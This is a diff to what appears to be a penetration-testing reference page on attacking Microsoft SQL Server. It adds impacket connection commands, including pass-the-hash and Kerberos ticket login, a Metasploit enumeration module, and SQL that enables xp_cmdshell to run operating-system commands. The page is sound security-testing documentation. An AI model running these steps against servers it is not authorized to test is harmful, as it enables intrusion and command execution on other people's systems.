@@ -5,8 +5,6 @@ disabled: true
 
 # MSSQL Abuse
 
-{/*TODO: How to connect to MSSQL using domain account from Linux and Windows? impacket-mssqlclient*/}
-
 ## MSSQL Authentication
 
 There are two options of authentication settings possible to set in SQL Server:
@@ -57,7 +55,7 @@ Linux:
 
 ```bash
 # Using SQL Server Authentication
-impacket-msssqlclient $user:$password@$host
+impacket-mssqlclient $user:$password@$host
 
 # Using Windows Auth with password
 impacket-mssqlclient -windows-auth $domain/$user:$password@$host
@@ -68,6 +66,29 @@ impacket-mssqlclient -windows-auth $domain/$user@$host -hashes :$nt_hash
 # Using Kerberos TGT
 export KRB5CCNAME=$tgt_ccache_file
 impacket-mssqlclient $hostname -k -no-pass -dc-ip $dc_ip
+```
+
+## Security checks
+
+```bash
+# Perform multiple security checks (credentials required)
+msfconsole
+> use admin/mssql/mssql_enum
+```
+
+## Command Exection
+
+Functions like `xp_cmdshell` are disabled in Microsoft SQL Server by default. If a user has appropriate permission, it can enable these features.
+
+```sql
+-- Reconfigure MSSQL settings
+EXECUTE sp_configure 'show advanced options', 1;
+RECONFIGURE;
+EXECUTE sp_configure 'xp_cmdshell', 1;
+RECONFIGURE;
+
+-- Execute command
+EXECUTE xp_cmdshell 'whoami';
 ```
 
 ## Linked servers
@@ -100,7 +121,7 @@ msfconsole
 > set password $password
 ```
 
-{/*TODO: SVC hash stealing, cmd execution*/}
+{/*TODO: SVC hash stealing*/}
 
 ## References
 
